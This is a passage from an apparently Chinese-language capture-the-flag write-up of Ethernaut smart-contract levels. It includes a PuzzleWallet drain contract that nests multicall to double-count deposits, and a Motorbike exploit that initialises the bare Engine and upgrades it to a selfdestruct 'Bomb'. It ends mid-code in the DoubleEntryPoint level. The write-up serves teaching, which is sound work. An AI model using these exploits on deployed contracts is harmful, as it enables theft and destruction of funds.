<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">whitelisted</span><span class="p">(</span><span class="nx">player</span><span class="p">)</span>
<span class="kc">false</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span>
<span class="s2">&quot;&lt;level-address&gt;&quot;</span><span class="w"> </span>
</code></pre></div>
</li>
<li>
<p>由于使用代理调用的方式，代理合约的 <code>pendingAdmin</code> 与逻辑合约的 <code>owner</code> 共享一个 slot，因而可先通过 <code>proposeNewAdmin</code> 更新 <code>owner</code>，随后将玩家添加到白名单中</p>
</li>
<li>同理，<code>maxBalance</code> 与 <code>admin</code> 共享一个 slot，而 <code>maxBalance</code> 可通过 <code>setMaxBalance</code> 更新，但首先需清空代理合约的余额</li>
<li><code>execute</code> 依据 <code>balances</code> 中记录的对应地址的余额进行转账，而 <code>balances</code> 只能通过 <code>deposit</code> 改变</li>
<li>
<p>注意到 <code>multicall</code> 中 <code>depositCalled</code> 不是状态变量而是函数内变量，因而嵌套调用 <code>multicall</code> 可绕过限制利用单次 transfer 进行重复 <code>deposit</code></p>
<div class="highlight"><pre><span></span><code><span class="c1">// 部署后将攻击合约添加到白名单中</span>
<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">PuzzleWallet</span><span class="w"> </span><span class="nx">wallet</span><span class="p">;</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">wallet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">PuzzleWallet</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// msg.value 设置为 0.001 eth，即代理合约初始余额</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">bytes</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">bytes</span><span class="p">[](</span><span class="mf">2</span><span class="p">);</span>
<span class="w">        </span><span class="nx">bytes</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">subdata</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">bytes</span><span class="p">[](</span><span class="mf">1</span><span class="p">);</span>
<span class="w">        </span><span class="nx">data</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;deposit()&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">subdata</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
<span class="w">        </span><span class="nx">data</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;multicall(bytes[])&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">subdata</span><span class="p">);</span>
<span class="w">        </span><span class="nx">wallet</span><span class="p">.</span><span class="nx">multicall</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">}(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">        </span><span class="nx">wallet</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p><code>delegatecall</code> 保持合约被调用时的 <code>msg.value</code></p>
</li>
</ul>
<h2 id="25-motorbike">25. Motorbike<a class="headerlink" href="#25-motorbike" title="Permanent link">&para;</a></h2>
<p>让 <code>Engine</code> 自毁，使 <code>Motorbike</code> 不可用</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>

<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">&lt;</span><span class="mf">0.7.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-06/utils/Address.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Motorbike</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span>
<span class="w">    </span><span class="c1">// constant variable does not have a storage slot</span>
<span class="w">    </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">_IMPLEMENTATION_SLOT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span>

<span class="w">    </span><span class="nx">struct</span><span class="w"> </span><span class="nx">AddressSlot</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_logic</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">Address</span><span class="p">.</span><span class="nx">isContract</span><span class="p">(</span><span class="nx">_logic</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;ERC1967: new implementation is not a contract&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">_getAddressSlot</span><span class="p">(</span><span class="nx">_IMPLEMENTATION_SLOT</span><span class="p">).</span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_logic</span><span class="p">;</span>
<span class="w">        </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_logic</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span>
<span class="w">            </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;initialize()&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="p">);</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Call failed&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Delegates the current call to `implementation`.</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_delegate</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">implementation</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">virtual</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// solhint-disable-next-line no-inline-assembly</span>
<span class="w">        </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">calldatacopy</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">calldatasize</span><span class="p">())</span>
<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">gas</span><span class="p">(),</span><span class="w"> </span><span class="nx">implementation</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">calldatasize</span><span class="p">(),</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span>
<span class="w">            </span><span class="nx">returndatacopy</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">returndatasize</span><span class="p">())</span>
<span class="w">            </span><span class="k">switch</span><span class="w"> </span><span class="nx">result</span>
<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">revert</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">returndatasize</span><span class="p">())</span><span class="w"> </span><span class="p">}</span>
<span class="w">            </span><span class="k">default</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">returndatasize</span><span class="p">())</span><span class="w"> </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Fallback function that delegates calls to the address returned by `_implementation()`. </span>
<span class="w">    </span><span class="c1">// Will run if no other function in the contract matches the call data</span>
<span class="w">    </span><span class="nx">fallback</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">virtual</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_delegate</span><span class="p">(</span><span class="nx">_getAddressSlot</span><span class="p">(</span><span class="nx">_IMPLEMENTATION_SLOT</span><span class="p">).</span><span class="nx">value</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Returns an `AddressSlot` with member `value` located at `slot`.</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_getAddressSlot</span><span class="p">(</span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">slot</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">pure</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">AddressSlot</span><span class="w"> </span><span class="nx">storage</span><span class="w"> </span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">r_slot</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">slot</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Engine</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Initializable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span>
<span class="w">    </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">_IMPLEMENTATION_SLOT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span>

<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">upgrader</span><span class="p">;</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">horsePower</span><span class="p">;</span>

<span class="w">    </span><span class="nx">struct</span><span class="w"> </span><span class="nx">AddressSlot</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">initialize</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">initializer</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">horsePower</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1000</span><span class="p">;</span>
<span class="w">        </span><span class="nx">upgrader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Upgrade the implementation of the proxy to `newImplementation`</span>
<span class="w">    </span><span class="c1">// subsequently execute the function call</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">upgradeToAndCall</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_authorizeUpgrade</span><span class="p">();</span>
<span class="w">        </span><span class="nx">_upgradeToAndCall</span><span class="p">(</span><span class="nx">newImplementation</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Restrict to upgrader role</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_authorizeUpgrade</span><span class="p">()</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">upgrader</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Can&#39;t upgrade&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Perform implementation upgrade with security checks for UUPS(Universal Upgradeable Proxy Standard) proxies, and additional setup call.</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_upgradeToAndCall</span><span class="p">(</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">,</span>
<span class="w">        </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">data</span>
<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// Initial upgrade and setup call</span>
<span class="w">        </span><span class="nx">_setImplementation</span><span class="p">(</span><span class="nx">newImplementation</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">            </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Call failed&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Stores a new address in the EIP1967 implementation slot.</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_setImplementation</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">Address</span><span class="p">.</span><span class="nx">isContract</span><span class="p">(</span><span class="nx">newImplementation</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;ERC1967: new implementation is not a contract&quot;</span><span class="p">);</span>

<span class="w">        </span><span class="nx">AddressSlot</span><span class="w"> </span><span class="nx">storage</span><span class="w"> </span><span class="nx">r</span><span class="p">;</span>
<span class="w">        </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">r_slot</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">_IMPLEMENTATION_SLOT</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nx">r</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>与透明代理模式不同，UUPS 代理模式由逻辑合约负责升级逻辑，因而代理合约部署的代价较小</li>
<li><code>upgrader</code> 可以使用 <code>upgradeToAndCall()</code> 更新逻辑合约并调用</li>
<li><code>Motorbike</code> 在部署时通过 <code>delegatecall</code> 调用 <code>Engine</code> 的 <code>initialize()</code>，<code>initialize()</code> 使用 <code>initializer</code> 函数修饰符，避免再次初始化<ul>
<li><code>initializer</code> 修饰符使用状态变量 <code>initialized</code> 和 <code>initializing</code> 记录或判断初始化状态</li>
</ul>
</li>
<li><code>initialized</code> 存储在 <code>Motorbike</code> 实例中，而不是 <code>Engine</code>，因而可以直接调用 <code>Engine</code> 实例的 <code>initialize()</code> 再更新其逻辑合约的地址并调用</li>
<li><em>不要让逻辑合约处于未初始化状态</em></li>
</ul>
<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="c1">// 获取 Engine 实例的地址</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&quot;</span><span class="p">);</span>
<span class="s2">&quot;0x000000000000000000000000e12c57f61db3891d41ddde5a6669591391ad30ab&quot;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="c1">// 部署新的逻辑合约</span>
<span class="nx">contract</span><span class="w"> </span><span class="nx">Bomb</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">fallback</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">selfdestruct</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
<span class="c1">// 调用 initialize 成为 upgrader，随后调用 upgradeToAndCall() 更新逻辑合约</span>
</code></pre></div>
<h3 id="_16">参考资料<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786">UUPS Proxies: Tutorial (Solidity + JavaScript) - Smart Contracts / Guides and Tutorials - OpenZeppelin Forum</a></li>
<li><a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#transparent-vs-uups">Proxies - OpenZeppelin Docs</a></li>
<li><a href="https://docs.soliditylang.org/en/latest/contracts.html#constants">Constant and Immutable State Variables</a></li>
<li><a href="https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable">Writing Upgradeable Contracts - OpenZeppelin Docs</a></li>
</ul>
<h2 id="26-doubleentrypoint">26. DoubleEntryPoint<a class="headerlink" href="#26-doubleentrypoint" title="Permanent link">&para;</a></h2>
<ul>
<li>防止合约 <code>CryptoVault</code> 被清空代币</li>
<li>实现能够正确告警以防止潜在攻击或漏洞利用的 <code>detection bot</code> 合约并在 <code>Forta</code> 注册</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-08/access/Ownable.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span><span class="p">;</span>

<span class="kr">interface</span><span class="w"> </span><span class="nx">DelegateERC20</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">delegateTransfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">origSender</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">);</span>
<span class="p">}</span>

<span class="kr">interface</span><span class="w"> </span><span class="nx">IDetectionBot</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">handleTransaction</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">user</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">msgData</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
<span class="p">}</span>

<span class="kr">interface</span><span class="w"> </span><span class="nx">IForta</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setDetectionBot</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">detectionBotAddress</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">notify</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">user</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">msgData</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">raiseAlert</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">user</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Forta</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">IForta</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">IDetectionBot</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">usersDetectionBots</span><span class="p">;</span>
<span class="w">  </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint256</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">botRaisedAlerts</span><span class="p">;</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setDetectionBot</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">detectionBotAddress</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">usersDetectionBots</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">IDetectionBot</span><span class="p">(</span><span class="nx">detectionBotAddress</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">notify</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">user</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">msgData</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">usersDetectionBots</span><span class="p">[</span><span class="nx">user</span><span class="p">])</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mf">0</span><span class="p">))</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="nx">usersDetectionBots</span><span class="p">[</span><span class="nx">user</span><span class="p">].</span><span class="nx">handleTransaction</span><span class="p">(</span><span class="nx">user</span><span class="p">,</span><span class="w"> </span><span class="nx">msgData</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">{}</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">raiseAlert</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">user</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">usersDetectionBots</span><span class="p">[</span><span class="nx">user</span><span class="p">])</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
<span class="w">      </span><span class="nx">botRaisedAlerts</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">CryptoVault</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">sweptTokensRecipient</span><span class="p">;</span><span class="w">  </span><span class="c1">// player</span>
<span class="w">    </span><span class="nx">IERC20</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">underlying</span><span class="p">;</span><span class="w"> </span><span class="c1">// DoubleEntryPoint</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">recipient</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">sweptTokensRecipient</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">recipient</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setUnderlying</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">latestToken</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">underlying</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mf">0</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;Already set&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">underlying</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">latestToken</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="cm">/*</span>
<span class="cm">    ...</span>
<span class="cm">    */</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">sweepToken</span><span class="p">(</span><span class="nx">IERC20</span><span class="w"> </span><span class="nx">token</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
